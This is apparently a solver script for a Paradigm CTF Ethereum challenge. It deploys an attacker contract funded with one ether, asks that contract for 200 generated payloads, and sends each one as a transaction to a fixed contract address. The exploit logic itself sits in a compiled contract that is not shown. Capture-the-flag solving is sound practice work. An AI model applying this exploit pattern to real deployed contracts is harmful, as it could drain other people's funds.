from eth_abi import encode
from eth_account import Account
from paradigmctf.eth_challenge import *
from web3 import Web3


def solve(web3: Web3, player: Account, setup: str):
    rcpt = send_tx(
        web3,
        {
            "from": player.address,
            "gas": 12_500_000,
            "value": web3.toWei(1, "ether"),
            "data": compile() + encode(["address"], [setup]),
        },
    )

    txs = []
    for i in range(200):
        resp = web3.eth.call(
            {
                "from": player.address,
                "to": rcpt.contractAddress,
                "gas": 1_000_000,
                "data": encode_function_call(web3, "generatePayload", ["uint256"], [i]),
            }
        )
        txs.append(
            {
                "from": player.address,
                "to": "0x03f34bE1BF910116595dB1b11E9d1B2cA5D59659",
                "gas": 1_000_000,
                "data": resp[64:],
            }
        )

    send_txs(web3, txs)


run_solver(solve)
